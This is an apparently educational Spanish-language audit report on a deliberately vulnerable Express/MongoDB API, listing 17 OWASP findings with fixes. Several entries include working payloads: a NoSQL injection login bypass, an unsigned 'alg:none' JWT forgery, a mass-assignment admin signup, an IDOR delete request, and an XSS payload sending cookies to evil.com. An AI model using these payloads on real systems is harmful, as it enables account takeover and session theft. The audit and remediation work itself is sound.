# Documentacion de Vulnerabilidades - Auditoria de Seguridad

## Resumen Ejecutivo

| Severidad | Cantidad |
|-----------|----------|
| Critical  | 5        |
| High      | 7        |
| Medium    | 4        |
| Low       | 1        |
| **Total** | **17**   |

---

## Tabla de Vulnerabilidades Encontradas

| # | Linea/Seccion | Vulnerabilidad | Tipo OWASP | Severidad | Impacto |
|---|---------------|----------------|------------|-----------|---------|
| 1 | Login endpoint | NoSQL Injection | A03:2021 | ⚠️ Critical | Bypass autenticacion |
| 2 | Password storage | Plaintext passwords | A02:2021 | ⚠️ Critical | Exposicion masiva |
| 3 | JWT Secret | Hardcoded secret | A02:2021 | ⚠️ Critical | Tokens falsificados |
| 4 | Delete endpoint | No ownership check (IDOR) | A01:2021 | ⚠️ Critical | Eliminar usuarios |
| 5 | Admin endpoint | No role verification | A01:2021 | ⚠️ Critical | Acceso no autorizado |
| 6 | Login endpoint | No rate limiting | A04:2021 | 🔴 High | Brute force |
| 7 | Search endpoint | Reflected XSS | A03:2021 | 🔴 High | Robo de sesiones |
| 8 | Register endpoint | No input validation | A03:2021 | 🔴 High | Data corruption |
| 9 | Register endpoint | Mass assignment | A01:2021 | 🔴 High | Privilege escalation |
| 10 | Register response | Expone password | A02:2021 | 🔴 High | Info disclosure |
| 11 | Error handler | Stack trace exposure | A05:2021 | 🔴 High | Info disclosure |
| 12 | JWT middleware | Algorithm confusion | A02:2021 | 🔴 High | Token forgery |
| 13 | Global | No Helmet.js | A05:2021 | 🟡 Medium | Missing headers |
| 14 | Login response | User enumeration | A01:2021 | 🟡 Medium | Facilita ataques |
| 15 | Global | No CORS restriction | A05:2021 | 🟡 Medium | CSRF attacks |
| 16 | Global | No body size limit | A05:2021 | 🟡 Medium | DoS attacks |
| 17 | Error handler | Logging sensitive data | A09:2021 | 🟢 Low | Info in logs |

---

## Detalle de Vulnerabilidades

### 1. NoSQL Injection (A03:2021 - Injection)

**Severidad**: ⚠️ CRITICAL
**CVSS Score**: 9.8
**CWE**: CWE-943

**Ubicacion**: `src/vulnerable-api/routes/index.ts:23-26`

**Descripcion**: El endpoint de login acepta objetos directamente en username y password, permitiendo operadores MongoDB maliciosos.

**Codigo Vulnerable**:
```typescript
const user = await VulnerableUser.findOne({
  username: username,
  password: password,
});
```

**Explotacion**:
```json
POST /api/login
{
  "username": { "$ne": null },
  "password": { "$ne": null }
}
```

**Impacto**:
- Bypass completo de autenticacion
- Acceso a cualquier cuenta sin credenciales
- Extraccion de datos sensibles

**Remediacion**:
```typescript
// Sanitizar entrada con express-mongo-sanitize
import mongoSanitize from 'express-mongo-sanitize';
app.use(mongoSanitize());

// Validar tipos de datos
if (typeof username !== 'string' || typeof password !== 'string') {
  return res.status(400).json({ error: 'Invalid input' });
}
```

---

### 2. Almacenamiento de Passwords en Texto Plano (A02:2021 - Cryptographic Failures)

**Severidad**: ⚠️ CRITICAL
**CVSS Score**: 9.1
**CWE**: CWE-256

**Ubicacion**: `src/vulnerable-api/models/user.model.ts:28-30`

**Descripcion**: Las passwords se almacenan sin ningun tipo de hash, directamente como texto plano en la base de datos.

**Codigo Vulnerable**:
```typescript
password: {
  type: String,
  // Sin hash, sin select: false
},
```

**Impacto**:
- Exposicion masiva de credenciales si la BD es comprometida
- Violacion de regulaciones (GDPR, PCI-DSS)
- Reutilizacion de passwords en otros servicios

**Remediacion**:
```typescript
import bcrypt from 'bcrypt';

UserSchema.pre('save', async function(next) {
  if (this.isModified('password')) {
    this.password = await bcrypt.hash(this.password, 12);
  }
  next();
});
```

---

### 3. JWT Secret Hardcodeado y Debil (A02:2021 - Cryptographic Failures)

**Severidad**: ⚠️ CRITICAL
**CVSS Score**: 9.0
**CWE**: CWE-798

**Ubicacion**: `src/vulnerable-api/middleware/auth.middleware.ts:10`

**Descripcion**: El secret JWT es la palabra "secret", hardcodeada en el codigo fuente.

**Codigo Vulnerable**:
```typescript
const JWT_SECRET = 'secret';
```

**Impacto**:
- Cualquier atacante puede generar tokens validos
- Suplantacion de identidad de cualquier usuario
- Escalada de privilegios a admin

**Remediacion**:
```typescript
// Usar variable de entorno
const JWT_SECRET = process.env.JWT_SECRET;

// Validar que existe y es suficientemente largo
if (!JWT_SECRET || JWT_SECRET.length < 32) {
  throw new Error('JWT_SECRET must be at least 32 characters');
}
```

---

### 4. IDOR - Insecure Direct Object Reference (A01:2021 - Broken Access Control)

**Severidad**: ⚠️ CRITICAL
**CVSS Score**: 8.6
**CWE**: CWE-639

**Ubicacion**: `src/vulnerable-api/routes/index.ts:121-124`

**Descripcion**: El endpoint DELETE /users/:id no verifica que el usuario autenticado sea el dueno del recurso o un admin.

**Codigo Vulnerable**:
```typescript
router.delete('/users/:id', vulnerableAuthenticate, async (req, res) => {
  // No hay verificacion de ownership
  await VulnerableUser.findByIdAndDelete(req.params.id);
  res.json({ success: true });
});
```

**Explotacion**:
```bash
# Usuario A puede eliminar cuenta de Usuario B
curl -X DELETE /api/users/USER_B_ID \
  -H "Authorization: TOKEN_USER_A"
```

**Impacto**:
- Eliminacion de cuentas ajenas
- Denegacion de servicio selectiva
- Manipulacion de datos de otros usuarios

**Remediacion**:
```typescript
router.delete('/users/:id', authenticate, async (req, res) => {
  // Verificar ownership o rol admin
  if (req.user.id !== req.params.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  await User.findByIdAndDelete(req.params.id);
});
```

---

### 5. Sin Verificacion de Rol en Endpoint Admin (A01:2021 - Broken Access Control)

**Severidad**: ⚠️ CRITICAL
**CVSS Score**: 8.8
**CWE**: CWE-285

**Ubicacion**: `src/vulnerable-api/routes/index.ts:131-141`

**Descripcion**: El endpoint /admin/users solo verifica autenticacion, no autorizacion por rol.

**Codigo Vulnerable**:
```typescript
router.get('/admin/users', vulnerableAuthenticate, async (req, res) => {
  // No verifica req.userRole === 'admin'
  const users = await VulnerableUser.find({});
  res.json({ total: users.length, users });
});
```

**Impacto**:
- Cualquier usuario autenticado accede a funciones admin
- Exposicion de todos los datos de usuarios
- Violacion de principio de minimo privilegio

**Remediacion**:
```typescript
const authorize = (...roles: string[]) => (req, res, next) => {
  if (!roles.includes(req.user.role)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
};

router.get('/admin/users', authenticate, authorize('admin'), ...);
```

---

### 6. Sin Rate Limiting (A04:2021 - Insecure Design)

**Severidad**: 🔴 HIGH
**CVSS Score**: 7.5
**CWE**: CWE-307

**Ubicacion**: `src/vulnerable-api/app.ts` (ausente)

**Descripcion**: No hay limitacion de intentos en el endpoint de login, permitiendo ataques de fuerza bruta.

**Codigo Vulnerable**:
```typescript
// No hay rate limiting configurado
app.use(express.json());
app.use('/api', routes);
```

**Impacto**:
- Ataques de fuerza bruta a passwords
- Credential stuffing
- Denegacion de servicio

**Remediacion**:
```typescript
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 5, // 5 intentos
  skipSuccessfulRequests: true,
  message: { error: 'Demasiados intentos, intente mas tarde' }
});

router.post('/login', loginLimiter, ...);
```

---

### 7. XSS Reflejado (A03:2021 - Injection)

**Severidad**: 🔴 HIGH
**CVSS Score**: 7.1
**CWE**: CWE-79

**Ubicacion**: `src/vulnerable-api/routes/index.ts:57-61`

**Descripcion**: El endpoint de busqueda renderiza HTML con input del usuario sin sanitizar.

**Codigo Vulnerable**:
```typescript
router.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Results for: ${query}</h1>`);
});
```

**Explotacion**:
```
GET /api/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
```

**Impacto**:
- Robo de cookies de sesion
- Ejecucion de codigo malicioso en navegador
- Phishing

**Remediacion**:
```typescript
// Opcion 1: Retornar JSON en lugar de HTML
router.get('/search', (req, res) => {
  res.json({ query: req.query.q, results: [] });
});

// Opcion 2: Sanitizar si debe ser HTML
import { escape } from 'html-escaper';
res.send(`<h1>Results for: ${escape(query)}</h1>`);
```

---

### 8. Sin Validacion de Entrada (A03:2021 - Injection)

**Severidad**: 🔴 HIGH
**CVSS Score**: 7.3
**CWE**: CWE-20

**Ubicacion**: `src/vulnerable-api/routes/index.ts:43-52`

**Descripcion**: El endpoint de registro no valida formato, longitud ni contenido de los campos.

**Codigo Vulnerable**:
```typescript
router.post('/register', async (req, res) => {
  const user = new VulnerableUser(req.body);
  await user.save();
});
```

**Impacto**:
- Datos malformados en base de datos
- Inyeccion de campos inesperados
- Corrupcion de datos

**Remediacion**:
```typescript
import Joi from 'joi';

const registerSchema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  email: Joi.string().email().required(),
  password: Joi.string().min(12).pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/).required()
});

router.post('/register', async (req, res) => {
  const { error, value } = registerSchema.validate(req.body);
  if (error) {
    return res.status(400).json({ error: 'Datos invalidos' });
  }
  // Continuar con value sanitizado
});
```

---

### 9. Mass Assignment (A01:2021 - Broken Access Control)

**Severidad**: 🔴 HIGH
**CVSS Score**: 8.1
**CWE**: CWE-915

**Ubicacion**: `src/vulnerable-api/routes/index.ts:46`

**Descripcion**: El modelo acepta todos los campos del request body, incluyendo 'role'.

**Codigo Vulnerable**:
```typescript
const user = new VulnerableUser(req.body);
```

**Explotacion**:
```json
POST /api/register
{
  "username": "attacker",
  "password": "123",
  "role": "admin"
}
```

**Impacto**:
- Escalada de privilegios automatica
- Creacion de cuentas admin
- Bypass de controles de acceso

**Remediacion**:
```typescript
// Extraer solo campos permitidos
const { username, email, password } = req.body;
const user = new User({
  username,
  email,
  password,
  role: 'user' // Siempre hardcodeado
});
```

---

### 10. Exposicion de Password en Respuesta (A02:2021 - Cryptographic Failures)

**Severidad**: 🔴 HIGH
**CVSS Score**: 7.5
**CWE**: CWE-200

**Ubicacion**: `src/vulnerable-api/routes/index.ts:31-37, 50`

**Descripcion**: Las respuestas de login y registro incluyen el password del usuario.

**Codigo Vulnerable**:
```typescript
res.json({
  token,
  user: {
    password: user.password, // ❌ Expone password
  },
});
```

**Impacto**:
- Passwords visibles en logs de red
- Exposicion en herramientas de desarrollo del navegador
- Filtracion a terceros (proxies, CDNs)

**Remediacion**:
```typescript
// En el modelo
password: { type: String, select: false }

// En la respuesta
const { password, ...safeUser } = user.toObject();
res.json({ user: safeUser });
```

---

### 11. Stack Trace en Respuestas de Error (A05:2021 - Security Misconfiguration)

**Severidad**: 🔴 HIGH
**CVSS Score**: 5.3
**CWE**: CWE-209

**Ubicacion**: `src/vulnerable-api/app.ts:31-40`

**Descripcion**: El error handler expone el stack trace completo en las respuestas.

**Codigo Vulnerable**:
```typescript
res.status(500).json({
  error: err.message,
  stack: err.stack,
  body: req.body,
});
```

**Impacto**:
- Revela estructura interna de la aplicacion
- Expone rutas de archivos del servidor
- Facilita ataques dirigidos

**Remediacion**:
```typescript
app.use((err, req, res, next) => {
  // Log interno completo
  logger.error(err);

  // Respuesta sanitizada
  res.status(500).json({
    error: process.env.NODE_ENV === 'production'
      ? 'Internal server error'
      : err.message
  });
});
```

---

### 12. JWT Algorithm Confusion (A02:2021 - Cryptographic Failures)

**Severidad**: 🔴 HIGH
**CVSS Score**: 8.2
**CWE**: CWE-327

**Ubicacion**: `src/vulnerable-api/middleware/auth.middleware.ts:26`

**Descripcion**: El middleware JWT no especifica algoritmos permitidos, pudiendo aceptar "none".

**Codigo Vulnerable**:
```typescript
const decoded = jwt.verify(token, JWT_SECRET);
// No especifica: { algorithms: ['HS256'] }
```

**Explotacion**:
```javascript
// Token con algoritmo "none" (sin firma)
const header = btoa('{"alg":"none","typ":"JWT"}');
const payload = btoa('{"id":"admin_id","role":"admin"}');
const token = `${header}.${payload}.`;
```

**Impacto**:
- Falsificacion de tokens sin conocer el secret
- Suplantacion de cualquier usuario
- Escalada a admin

**Remediacion**:
```typescript
const decoded = jwt.verify(token, JWT_SECRET, {
  algorithms: ['HS256'], // Solo permitir HS256
  issuer: 'my-api',
  complete: true
});
```

---

### 13. Sin Headers de Seguridad HTTP (A05:2021 - Security Misconfiguration)

**Severidad**: 🟡 MEDIUM
**CVSS Score**: 5.0
**CWE**: CWE-693

**Ubicacion**: `src/vulnerable-api/app.ts` (ausente)

**Descripcion**: No se usa Helmet ni se configuran headers de seguridad.

**Headers Faltantes**:
- X-Content-Type-Options
- X-Frame-Options
- Strict-Transport-Security
- Content-Security-Policy
- X-XSS-Protection

**Impacto**:
- Clickjacking
- MIME sniffing attacks
- Falta de HSTS

**Remediacion**:
```typescript
import helmet from 'helmet';

app.use(helmet());
app.disable('x-powered-by');
```

---

### 14. User Enumeration (A01:2021 - Broken Access Control)

**Severidad**: 🟡 MEDIUM
**CVSS Score**: 5.3
**CWE**: CWE-204

**Ubicacion**: `src/vulnerable-api/routes/index.ts:38`

**Descripcion**: El mensaje de error de login permite inferir si un usuario existe.

**Codigo Vulnerable**:
```typescript
// Mensaje diferente segun exista o no el usuario
res.status(401).json({ error: 'Invalid credentials' });
// vs
res.status(401).json({ error: 'User not found' });
```

**Impacto**:
- Enumeracion de usuarios validos
- Lista de targets para ataques
- Phishing mas efectivo

**Remediacion**:
```typescript
// Siempre el mismo mensaje y tiempo de respuesta
const dummyHash = '$2b$12$dummy';
const validPassword = user
  ? await bcrypt.compare(password, user.password)
  : await bcrypt.compare(password, dummyHash);

if (!user || !validPassword) {
  return res.status(401).json({ error: 'Invalid credentials' });
}
```

---

### 15. CORS Permisivo (A05:2021 - Security Misconfiguration)

**Severidad**: 🟡 MEDIUM
**CVSS Score**: 5.0
**CWE**: CWE-942

**Ubicacion**: `src/vulnerable-api/app.ts` (ausente)

**Descripcion**: No hay configuracion CORS, permitiendo requests de cualquier origen.

**Impacto**:
- Ataques CSRF
- Acceso desde dominios maliciosos
- Exfiltracion de datos

**Remediacion**:
```typescript
import cors from 'cors';

app.use(cors({
  origin: process.env.ALLOWED_ORIGINS?.split(',') || 'https://myapp.com',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

---

### 16. Sin Limite de Tamano del Body (A05:2021 - Security Misconfiguration)

**Severidad**: 🟡 MEDIUM
**CVSS Score**: 5.0
**CWE**: CWE-400

**Ubicacion**: `src/vulnerable-api/app.ts:19`

**Descripcion**: El parser JSON no tiene limite de tamano.

**Codigo Vulnerable**:
```typescript
app.use(express.json()); // Sin limite
```

**Impacto**:
- Denegacion de servicio por payload grande
- Agotamiento de memoria
- Crashes del servidor

**Remediacion**:
```typescript
app.use(express.json({ limit: '10kb' }));
app.use(express.urlencoded({ limit: '10kb', extended: true }));
```

---

### 17. Logging de Datos Sensibles (A09:2021 - Security Logging and Monitoring Failures)

**Severidad**: 🟢 LOW
**CVSS Score**: 3.0
**CWE**: CWE-532

**Ubicacion**: `src/vulnerable-api/app.ts:28-29`

**Descripcion**: El error handler loguea el request body completo, que puede incluir passwords.

**Codigo Vulnerable**:
```typescript
console.log('Request body:', req.body);
```

**Impacto**:
- Passwords en archivos de log
- Violacion de privacidad
- Exposicion en sistemas de monitoreo

**Remediacion**:
```typescript
import winston from 'winston';

const logger = winston.createLogger({
  format: winston.format.combine(
    winston.format((info) => {
      // Sanitizar datos sensibles
      if (info.body?.password) info.body.password = '[REDACTED]';
      return info;
    })(),
    winston.format.json()
  )
});
```

---

## Referencias OWASP

- [A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [A02:2021 - Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [A04:2021 - Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
- [A05:2021 - Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [A09:2021 - Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)

---

## Checklist de Verificacion

- [ ] NoSQL Injection prevenido con sanitizacion
- [ ] Passwords hasheados con bcrypt (12+ rounds)
- [ ] JWT secret en variable de entorno (32+ chars)
- [ ] Verificacion de ownership en CRUD
- [ ] Verificacion de rol en endpoints admin
- [ ] Rate limiting en login (5 intentos/15min)
- [ ] Respuestas JSON (no HTML)
- [ ] Validacion con Joi
- [ ] Sin mass assignment (campos explicitos)
- [ ] Password excluido de respuestas
- [ ] Error handler sin stack trace
- [ ] JWT con algoritmo explicito
- [ ] Helmet configurado
- [ ] Mensajes de error genericos
- [ ] CORS restrictivo
- [ ] Limite de body (10kb)
- [ ] Logging sin datos sensibles
